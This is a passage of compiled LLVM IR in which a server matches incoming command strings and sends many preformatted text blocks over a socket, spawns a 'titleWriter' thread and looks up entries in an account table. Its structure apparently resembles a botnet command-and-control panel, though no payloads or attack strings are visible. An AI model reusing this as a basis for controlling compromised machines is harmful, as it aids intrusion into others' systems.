  %743 = icmp ne i8* %742, null
  br i1 %743, label %756, label %744

; <label>:744:                                    ; preds = %740
  %745 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %746 = call i8* @strstr(i8* %745, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0)) #8
  %747 = icmp ne i8* %746, null
  br i1 %747, label %756, label %748

; <label>:748:                                    ; preds = %744
  %749 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %750 = call i8* @strstr(i8* %749, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0)) #8
  %751 = icmp ne i8* %750, null
  br i1 %751, label %756, label %752

; <label>:752:                                    ; preds = %748
  %753 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %754 = call i8* @strstr(i8* %753, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #8
  %755 = icmp ne i8* %754, null
  br i1 %755, label %756, label %897

; <label>:756:                                    ; preds = %752, %748, %744, %740
  %757 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %758 = call i32 (i8*, i8*, ...) @sprintf(i8* %757, i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.71, i32 0, i32 0)) #7
  %759 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %760 = call i32 (i8*, i8*, ...) @sprintf(i8* %759, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %761 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %762 = call i32 (i8*, i8*, ...) @sprintf(i8* %761, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.72, i32 0, i32 0)) #7
  %763 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %764 = call i32 (i8*, i8*, ...) @sprintf(i8* %763, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.73, i32 0, i32 0)) #7
  %765 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %766 = call i32 (i8*, i8*, ...) @sprintf(i8* %765, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.74, i32 0, i32 0)) #7
  %767 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %768 = call i32 (i8*, i8*, ...) @sprintf(i8* %767, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.75, i32 0, i32 0)) #7
  %769 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %770 = call i32 (i8*, i8*, ...) @sprintf(i8* %769, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.76, i32 0, i32 0)) #7
  %771 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %772 = call i32 (i8*, i8*, ...) @sprintf(i8* %771, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.77, i32 0, i32 0)) #7
  %773 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %774 = call i32 (i8*, i8*, ...) @sprintf(i8* %773, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.78, i32 0, i32 0)) #7
  %775 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %776 = call i32 (i8*, i8*, ...) @sprintf(i8* %775, i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.79, i32 0, i32 0)) #7
  %777 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %778 = call i32 (i8*, i8*, ...) @sprintf(i8* %777, i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.80, i32 0, i32 0)) #7
  %779 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %780 = call i32 (i8*, i8*, ...) @sprintf(i8* %779, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %781 = load i32, i32* %4, align 4
  %782 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %783 = getelementptr inbounds [5000 x i8], [5000 x i8]* %50, i32 0, i32 0
  %784 = call i64 @strlen(i8* %783) #8
  %785 = call i64 @send(i32 %781, i8* %782, i64 %784, i32 16384)
  %786 = icmp eq i64 %785, -1
  br i1 %786, label %787, label %788

; <label>:787:                                    ; preds = %756
  br label %2101

; <label>:788:                                    ; preds = %756
  %789 = load i32, i32* %4, align 4
  %790 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %791 = getelementptr inbounds [5000 x i8], [5000 x i8]* %51, i32 0, i32 0
  %792 = call i64 @strlen(i8* %791) #8
  %793 = call i64 @send(i32 %789, i8* %790, i64 %792, i32 16384)
  %794 = icmp eq i64 %793, -1
  br i1 %794, label %795, label %796

; <label>:795:                                    ; preds = %788
  br label %2101

; <label>:796:                                    ; preds = %788
  %797 = load i32, i32* %4, align 4
  %798 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %799 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i32 0, i32 0
  %800 = call i64 @strlen(i8* %799) #8
  %801 = call i64 @send(i32 %797, i8* %798, i64 %800, i32 16384)
  %802 = icmp eq i64 %801, -1
  br i1 %802, label %803, label %804

; <label>:803:                                    ; preds = %796
  br label %2101

; <label>:804:                                    ; preds = %796
  %805 = load i32, i32* %4, align 4
  %806 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %807 = getelementptr inbounds [5000 x i8], [5000 x i8]* %53, i32 0, i32 0
  %808 = call i64 @strlen(i8* %807) #8
  %809 = call i64 @send(i32 %805, i8* %806, i64 %808, i32 16384)
  %810 = icmp eq i64 %809, -1
  br i1 %810, label %811, label %812

; <label>:811:                                    ; preds = %804
  br label %2101

; <label>:812:                                    ; preds = %804
  %813 = load i32, i32* %4, align 4
  %814 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %815 = getelementptr inbounds [5000 x i8], [5000 x i8]* %54, i32 0, i32 0
  %816 = call i64 @strlen(i8* %815) #8
  %817 = call i64 @send(i32 %813, i8* %814, i64 %816, i32 16384)
  %818 = icmp eq i64 %817, -1
  br i1 %818, label %819, label %820

; <label>:819:                                    ; preds = %812
  br label %2101

; <label>:820:                                    ; preds = %812
  %821 = load i32, i32* %4, align 4
  %822 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %823 = getelementptr inbounds [5000 x i8], [5000 x i8]* %55, i32 0, i32 0
  %824 = call i64 @strlen(i8* %823) #8
  %825 = call i64 @send(i32 %821, i8* %822, i64 %824, i32 16384)
  %826 = icmp eq i64 %825, -1
  br i1 %826, label %827, label %828

; <label>:827:                                    ; preds = %820
  br label %2101

; <label>:828:                                    ; preds = %820
  %829 = load i32, i32* %4, align 4
  %830 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %831 = getelementptr inbounds [5000 x i8], [5000 x i8]* %56, i32 0, i32 0
  %832 = call i64 @strlen(i8* %831) #8
  %833 = call i64 @send(i32 %829, i8* %830, i64 %832, i32 16384)
  %834 = icmp eq i64 %833, -1
  br i1 %834, label %835, label %836

; <label>:835:                                    ; preds = %828
  br label %2101

; <label>:836:                                    ; preds = %828
  %837 = load i32, i32* %4, align 4
  %838 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %839 = getelementptr inbounds [5000 x i8], [5000 x i8]* %57, i32 0, i32 0
  %840 = call i64 @strlen(i8* %839) #8
  %841 = call i64 @send(i32 %837, i8* %838, i64 %840, i32 16384)
  %842 = icmp eq i64 %841, -1
  br i1 %842, label %843, label %844

; <label>:843:                                    ; preds = %836
  br label %2101

; <label>:844:                                    ; preds = %836
  %845 = load i32, i32* %4, align 4
  %846 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %847 = getelementptr inbounds [5000 x i8], [5000 x i8]* %58, i32 0, i32 0
  %848 = call i64 @strlen(i8* %847) #8
  %849 = call i64 @send(i32 %845, i8* %846, i64 %848, i32 16384)
  %850 = icmp eq i64 %849, -1
  br i1 %850, label %851, label %852

; <label>:851:                                    ; preds = %844
  br label %2101

; <label>:852:                                    ; preds = %844
  %853 = load i32, i32* %4, align 4
  %854 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %855 = getelementptr inbounds [5000 x i8], [5000 x i8]* %59, i32 0, i32 0
  %856 = call i64 @strlen(i8* %855) #8
  %857 = call i64 @send(i32 %853, i8* %854, i64 %856, i32 16384)
  %858 = icmp eq i64 %857, -1
  br i1 %858, label %859, label %860

; <label>:859:                                    ; preds = %852
  br label %2101

; <label>:860:                                    ; preds = %852
  %861 = load i32, i32* %4, align 4
  %862 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %863 = getelementptr inbounds [5000 x i8], [5000 x i8]* %60, i32 0, i32 0
  %864 = call i64 @strlen(i8* %863) #8
  %865 = call i64 @send(i32 %861, i8* %862, i64 %864, i32 16384)
  %866 = icmp eq i64 %865, -1
  br i1 %866, label %867, label %868

; <label>:867:                                    ; preds = %860
  br label %2101

; <label>:868:                                    ; preds = %860
  %869 = load i32, i32* %4, align 4
  %870 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %871 = getelementptr inbounds [5000 x i8], [5000 x i8]* %61, i32 0, i32 0
  %872 = call i64 @strlen(i8* %871) #8
  %873 = call i64 @send(i32 %869, i8* %870, i64 %872, i32 16384)
  %874 = icmp eq i64 %873, -1
  br i1 %874, label %875, label %876

; <label>:875:                                    ; preds = %868
  br label %2101

; <label>:876:                                    ; preds = %868
  %877 = load i8*, i8** %3, align 8
  %878 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %877) #7
  br label %879

; <label>:879:                                    ; preds = %876
  %880 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %881 = load i32, i32* %5, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %882
  %884 = getelementptr inbounds %struct.account, %struct.account* %883, i32 0, i32 0
  %885 = getelementptr inbounds [20 x i8], [20 x i8]* %884, i32 0, i32 0
  %886 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %887 = call i32 (i8*, i8*, ...) @sprintf(i8* %880, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %885, i8* %886) #7
  %888 = load i32, i32* %4, align 4
  %889 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %890 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %891 = call i64 @strlen(i8* %890) #8
  %892 = call i64 @send(i32 %888, i8* %889, i64 %891, i32 16384)
  %893 = icmp eq i64 %892, -1
  br i1 %893, label %894, label %895

; <label>:894:                                    ; preds = %879
  br label %2101

; <label>:895:                                    ; preds = %879
  br label %896

; <label>:896:                                    ; preds = %895
  br label %337

; <label>:897:                                    ; preds = %752
  %898 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %899 = call i8* @strstr(i8* %898, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.81, i32 0, i32 0)) #8
  %900 = icmp ne i8* %899, null
  br i1 %900, label %917, label %901

; <label>:901:                                    ; preds = %897
  %902 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %903 = call i8* @strstr(i8* %902, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.82, i32 0, i32 0)) #8
  %904 = icmp ne i8* %903, null
  br i1 %904, label %917, label %905

; <label>:905:                                    ; preds = %901
  %906 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %907 = call i8* @strstr(i8* %906, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.83, i32 0, i32 0)) #8
  %908 = icmp ne i8* %907, null
  br i1 %908, label %917, label %909

; <label>:909:                                    ; preds = %905
  %910 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %911 = call i8* @strstr(i8* %910, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0)) #8
  %912 = icmp ne i8* %911, null
  br i1 %912, label %917, label %913

; <label>:913:                                    ; preds = %909
  %914 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %915 = call i8* @strstr(i8* %914, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.85, i32 0, i32 0)) #8
  %916 = icmp ne i8* %915, null
  br i1 %916, label %917, label %990

; <label>:917:                                    ; preds = %913, %909, %905, %901, %897
  %918 = load i8*, i8** %3, align 8
  %919 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %918) #7
  %920 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %921 = call i32 (i8*, i8*, ...) @sprintf(i8* %920, i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.86, i32 0, i32 0)) #7
  %922 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %923 = call i32 (i8*, i8*, ...) @sprintf(i8* %922, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %924 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %925 = call i32 (i8*, i8*, ...) @sprintf(i8* %924, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.87, i32 0, i32 0)) #7
  %926 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %927 = call i32 (i8*, i8*, ...) @sprintf(i8* %926, i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.88, i32 0, i32 0)) #7
  %928 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %929 = call i32 (i8*, i8*, ...) @sprintf(i8* %928, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %930 = load i32, i32* %4, align 4
  %931 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %932 = getelementptr inbounds [5000 x i8], [5000 x i8]* %62, i32 0, i32 0
  %933 = call i64 @strlen(i8* %932) #8
  %934 = call i64 @send(i32 %930, i8* %931, i64 %933, i32 16384)
  %935 = icmp eq i64 %934, -1
  br i1 %935, label %936, label %937

; <label>:936:                                    ; preds = %917
  br label %2101

; <label>:937:                                    ; preds = %917
  %938 = load i32, i32* %4, align 4
  %939 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %940 = getelementptr inbounds [5000 x i8], [5000 x i8]* %63, i32 0, i32 0
  %941 = call i64 @strlen(i8* %940) #8
  %942 = call i64 @send(i32 %938, i8* %939, i64 %941, i32 16384)
  %943 = icmp eq i64 %942, -1
  br i1 %943, label %944, label %945

; <label>:944:                                    ; preds = %937
  br label %2101

; <label>:945:                                    ; preds = %937
  %946 = load i32, i32* %4, align 4
  %947 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %948 = getelementptr inbounds [5000 x i8], [5000 x i8]* %64, i32 0, i32 0
  %949 = call i64 @strlen(i8* %948) #8
  %950 = call i64 @send(i32 %946, i8* %947, i64 %949, i32 16384)
  %951 = icmp eq i64 %950, -1
  br i1 %951, label %952, label %953

; <label>:952:                                    ; preds = %945
  br label %2101

; <label>:953:                                    ; preds = %945
  %954 = load i32, i32* %4, align 4
  %955 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %956 = getelementptr inbounds [5000 x i8], [5000 x i8]* %65, i32 0, i32 0
  %957 = call i64 @strlen(i8* %956) #8
  %958 = call i64 @send(i32 %954, i8* %955, i64 %957, i32 16384)
  %959 = icmp eq i64 %958, -1
  br i1 %959, label %960, label %961

; <label>:960:                                    ; preds = %953
  br label %2101

; <label>:961:                                    ; preds = %953
  %962 = load i32, i32* %4, align 4
  %963 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %964 = getelementptr inbounds [5000 x i8], [5000 x i8]* %66, i32 0, i32 0
  %965 = call i64 @strlen(i8* %964) #8
  %966 = call i64 @send(i32 %962, i8* %963, i64 %965, i32 16384)
  %967 = icmp eq i64 %966, -1
  br i1 %967, label %968, label %969

; <label>:968:                                    ; preds = %961
  br label %2101

; <label>:969:                                    ; preds = %961
  %970 = load i8*, i8** %3, align 8
  %971 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %970) #7
  br label %972

; <label>:972:                                    ; preds = %969
  %973 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %974 = load i32, i32* %5, align 4
  %975 = sext i32 %974 to i64
  %976 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %975
  %977 = getelementptr inbounds %struct.account, %struct.account* %976, i32 0, i32 0
  %978 = getelementptr inbounds [20 x i8], [20 x i8]* %977, i32 0, i32 0
  %979 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %980 = call i32 (i8*, i8*, ...) @sprintf(i8* %973, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %978, i8* %979) #7
  %981 = load i32, i32* %4, align 4
  %982 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %983 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %984 = call i64 @strlen(i8* %983) #8
  %985 = call i64 @send(i32 %981, i8* %982, i64 %984, i32 16384)
  %986 = icmp eq i64 %985, -1
  br i1 %986, label %987, label %988

; <label>:987:                                    ; preds = %972
  br label %2101

; <label>:988:                                    ; preds = %972
  br label %989

; <label>:989:                                    ; preds = %988
  br label %337

; <label>:990:                                    ; preds = %913
  %991 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %992 = call i8* @strstr(i8* %991, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.89, i32 0, i32 0)) #8
  %993 = icmp ne i8* %992, null
  br i1 %993, label %1002, label %994

; <label>:994:                                    ; preds = %990
  %995 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %996 = call i8* @strstr(i8* %995, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0)) #8
  %997 = icmp ne i8* %996, null
  br i1 %997, label %1002, label %998

; <label>:998:                                    ; preds = %994
  %999 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1000 = call i8* @strstr(i8* %999, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.91, i32 0, i32 0)) #8
  %1001 = icmp ne i8* %1000, null
  br i1 %1001, label %1002, label %1255

; <label>:1002:                                   ; preds = %998, %994, %990
  %1003 = load i8*, i8** %3, align 8
  %1004 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1003) #7
  %1005 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1006 = call i32 (i8*, i8*, ...) @sprintf(i8* %1005, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.92, i32 0, i32 0)) #7
  %1007 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1008 = call i32 (i8*, i8*, ...) @sprintf(i8* %1007, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1009 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1010 = call i32 (i8*, i8*, ...) @sprintf(i8* %1009, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.93, i32 0, i32 0)) #7
  %1011 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1012 = call i32 (i8*, i8*, ...) @sprintf(i8* %1011, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.94, i32 0, i32 0)) #7
  %1013 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1014 = call i32 (i8*, i8*, ...) @sprintf(i8* %1013, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.95, i32 0, i32 0)) #7
  %1015 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1016 = call i32 (i8*, i8*, ...) @sprintf(i8* %1015, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.96, i32 0, i32 0)) #7
  %1017 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1018 = call i32 (i8*, i8*, ...) @sprintf(i8* %1017, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.97, i32 0, i32 0)) #7
  %1019 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1020 = call i32 (i8*, i8*, ...) @sprintf(i8* %1019, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.98, i32 0, i32 0)) #7
  %1021 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1022 = call i32 (i8*, i8*, ...) @sprintf(i8* %1021, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.99, i32 0, i32 0)) #7
  %1023 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1024 = call i32 (i8*, i8*, ...) @sprintf(i8* %1023, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.100, i32 0, i32 0)) #7
  %1025 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1026 = call i32 (i8*, i8*, ...) @sprintf(i8* %1025, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.101, i32 0, i32 0)) #7
  %1027 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1028 = call i32 (i8*, i8*, ...) @sprintf(i8* %1027, i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.102, i32 0, i32 0)) #7
  %1029 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1030 = call i32 (i8*, i8*, ...) @sprintf(i8* %1029, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1031 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1032 = call i32 (i8*, i8*, ...) @sprintf(i8* %1031, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.103, i32 0, i32 0)) #7
  %1033 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1034 = call i32 (i8*, i8*, ...) @sprintf(i8* %1033, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.104, i32 0, i32 0)) #7
  %1035 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1036 = call i32 (i8*, i8*, ...) @sprintf(i8* %1035, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.105, i32 0, i32 0)) #7
  %1037 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1038 = call i32 (i8*, i8*, ...) @sprintf(i8* %1037, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.106, i32 0, i32 0)) #7
  %1039 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1040 = call i32 (i8*, i8*, ...) @sprintf(i8* %1039, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.107, i32 0, i32 0)) #7
  %1041 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1042 = call i32 (i8*, i8*, ...) @sprintf(i8* %1041, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.108, i32 0, i32 0)) #7
  %1043 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1044 = call i32 (i8*, i8*, ...) @sprintf(i8* %1043, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.109, i32 0, i32 0)) #7
  %1045 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1046 = call i32 (i8*, i8*, ...) @sprintf(i8* %1045, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.110, i32 0, i32 0)) #7
  %1047 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1048 = call i32 (i8*, i8*, ...) @sprintf(i8* %1047, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.111, i32 0, i32 0)) #7
  %1049 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1050 = call i32 (i8*, i8*, ...) @sprintf(i8* %1049, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1051 = load i32, i32* %4, align 4
  %1052 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1053 = getelementptr inbounds [5000 x i8], [5000 x i8]* %67, i32 0, i32 0
  %1054 = call i64 @strlen(i8* %1053) #8
  %1055 = call i64 @send(i32 %1051, i8* %1052, i64 %1054, i32 16384)
  %1056 = icmp eq i64 %1055, -1
  br i1 %1056, label %1057, label %1058

; <label>:1057:                                   ; preds = %1002
  br label %2101

; <label>:1058:                                   ; preds = %1002
  %1059 = load i32, i32* %4, align 4
  %1060 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1061 = getelementptr inbounds [5000 x i8], [5000 x i8]* %68, i32 0, i32 0
  %1062 = call i64 @strlen(i8* %1061) #8
  %1063 = call i64 @send(i32 %1059, i8* %1060, i64 %1062, i32 16384)
  %1064 = icmp eq i64 %1063, -1
  br i1 %1064, label %1065, label %1066

; <label>:1065:                                   ; preds = %1058
  br label %2101

; <label>:1066:                                   ; preds = %1058
  %1067 = load i32, i32* %4, align 4
  %1068 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1069 = getelementptr inbounds [5000 x i8], [5000 x i8]* %69, i32 0, i32 0
  %1070 = call i64 @strlen(i8* %1069) #8
  %1071 = call i64 @send(i32 %1067, i8* %1068, i64 %1070, i32 16384)
  %1072 = icmp eq i64 %1071, -1
  br i1 %1072, label %1073, label %1074

; <label>:1073:                                   ; preds = %1066
  br label %2101

; <label>:1074:                                   ; preds = %1066
  %1075 = load i32, i32* %4, align 4
  %1076 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1077 = getelementptr inbounds [5000 x i8], [5000 x i8]* %70, i32 0, i32 0
  %1078 = call i64 @strlen(i8* %1077) #8
  %1079 = call i64 @send(i32 %1075, i8* %1076, i64 %1078, i32 16384)
  %1080 = icmp eq i64 %1079, -1
  br i1 %1080, label %1081, label %1082

; <label>:1081:                                   ; preds = %1074
  br label %2101

; <label>:1082:                                   ; preds = %1074
  %1083 = load i32, i32* %4, align 4
  %1084 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1085 = getelementptr inbounds [5000 x i8], [5000 x i8]* %71, i32 0, i32 0
  %1086 = call i64 @strlen(i8* %1085) #8
  %1087 = call i64 @send(i32 %1083, i8* %1084, i64 %1086, i32 16384)
  %1088 = icmp eq i64 %1087, -1
  br i1 %1088, label %1089, label %1090

; <label>:1089:                                   ; preds = %1082
  br label %2101

; <label>:1090:                                   ; preds = %1082
  %1091 = load i32, i32* %4, align 4
  %1092 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1093 = getelementptr inbounds [5000 x i8], [5000 x i8]* %72, i32 0, i32 0
  %1094 = call i64 @strlen(i8* %1093) #8
  %1095 = call i64 @send(i32 %1091, i8* %1092, i64 %1094, i32 16384)
  %1096 = icmp eq i64 %1095, -1
  br i1 %1096, label %1097, label %1098

; <label>:1097:                                   ; preds = %1090
  br label %2101

; <label>:1098:                                   ; preds = %1090
  %1099 = load i32, i32* %4, align 4
  %1100 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1101 = getelementptr inbounds [5000 x i8], [5000 x i8]* %73, i32 0, i32 0
  %1102 = call i64 @strlen(i8* %1101) #8
  %1103 = call i64 @send(i32 %1099, i8* %1100, i64 %1102, i32 16384)
  %1104 = icmp eq i64 %1103, -1
  br i1 %1104, label %1105, label %1106

; <label>:1105:                                   ; preds = %1098
  br label %2101

; <label>:1106:                                   ; preds = %1098
  %1107 = load i32, i32* %4, align 4
  %1108 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1109 = getelementptr inbounds [5000 x i8], [5000 x i8]* %74, i32 0, i32 0
  %1110 = call i64 @strlen(i8* %1109) #8
  %1111 = call i64 @send(i32 %1107, i8* %1108, i64 %1110, i32 16384)
  %1112 = icmp eq i64 %1111, -1
  br i1 %1112, label %1113, label %1114

; <label>:1113:                                   ; preds = %1106
  br label %2101

; <label>:1114:                                   ; preds = %1106
  %1115 = load i32, i32* %4, align 4
  %1116 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
  %1117 = getelementptr inbounds [5000 x i8], [5000 x i8]* %75, i32 0, i32 0
